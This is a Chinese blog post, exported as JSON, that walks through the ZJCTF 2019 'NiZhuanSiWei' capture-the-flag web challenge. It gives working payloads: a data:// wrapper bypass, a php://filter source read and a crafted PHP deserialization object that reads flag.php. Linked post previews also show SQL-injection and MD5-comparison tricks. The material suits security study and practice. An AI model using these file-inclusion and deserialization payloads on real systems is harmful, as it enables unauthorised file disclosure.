{"title":"ZJCTF 2019-NiZhuanSiWei","uid":"436ac58f1a1d63b58d899e0fdddfbd9b","slug":"ZJCTF-2019-NiZhuanSiWei","date":"2023-04-01T11:57:05.000Z","updated":"2023-04-01T12:13:23.883Z","comments":true,"path":"api/articles/ZJCTF-2019-NiZhuanSiWei.json","keywords":null,"cover":[],"content":"<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/1.png\"></p>\n<p>进入题目，分析源码</p>\n<p>首先要通过GET方式输入变量text，file_get_contents() 的功能是把整个文件读入一个字符串中。</p>\n<p>即要求输入的text为一个text类型的文件且内容为welcome to the zjctf</p>\n<p>可以通过PHP协议中的php:&#x2F;&#x2F;input或者data:&#x2F;&#x2F;写入</p>\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>\n<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/2.png\"></p>\n<p>接下来匹配file中输入的内容，如果preg_match匹配为flag则退出，否则通过include包含文件</p>\n<p>根据提示访问useless.php </p>\n<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/3.png\"></p>\n<p>页面内容为空</p>\n<p>尝试通过php:&#x2F;&#x2F;filter的方式读取useless.php的内容</p>\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>\n<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/4.png\"></p>\n<p>对得到的内容进行base64解码，内容为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php  \n\nclass Flag&#123;  &#x2F;&#x2F;flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125;  \n?&gt;  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>else中通过unserialize反序列化获取password中的内容</p>\n<p>通过序列化操作构造需要输入的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\nclass Flag&#123;  &#x2F;&#x2F;flag.php\n    public $file &#x3D; &quot;flag.php&quot;;\n&#125;\n\necho(serialize(new Flag()));\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>结果为O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<p>最终payload为</p>\n<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>\n<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/7.png\"></p>\n<p>查看网页源代码，得到flag</p>\n<p><img src=\"/images/ZJCTF-2019-NiZhuanSiWei/8.png\"></p>\n","feature":true,"text":" 进入题目，分析源码 首先要通过GET方式输入变量text，file_get_contents() 的功能是把整个文件读入一个字符串中。 即要求输入的text为一个text类型的文件且内容为welcome to the zjctf 可以通过PHP协议中的php:&#x2F;&#x...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"极客大挑战 2019-HardSQL","uid":"cdd9aa3771bb02f44f999a05704db558","slug":"极客大挑战-2019-HardSQL","date":"2023-04-04T11:38:01.000Z","updated":"2023-04-06T11:08:04.669Z","comments":true,"path":"api/articles/极客大挑战-2019-HardSQL.json","keywords":null,"cover":[],"text":" 闭合符为’ 去掉空格 判断是过滤了空格 尝试&#x2F;**&#x2F;代替空格也被过滤 尝试用()的方式绕过 admin&#39;union(database())# 还是被过滤 尝试报错注入 admin&#39;or(updatexml(1,concat(0x7e,data...","link":"","photos":[],"count_time":{"symbolsCount":690,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"nkctf-2023-eazy_php","uid":"7681339df153dad872cbe7903af30788","slug":"nkctf-2023-eazy-php","date":"2023-03-30T12:05:41.000Z","updated":"2023-03-31T09:53:46.061Z","comments":true,"path":"api/articles/nkctf-2023-eazy-php.json","keywords":null,"cover":[],"text":" 第一个if要求输入a和b，要求a不等于b但是a，b的MD5值相等，采用的是弱比较 令a&#x3D;QNKCDZO，b&#x3D;240610708 二者的md5值表示为科学计数法且前缀都为0e，0的多少次方都是0，通过 第二个if要求c和d不相等但是sha1值相等，采用强比较 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}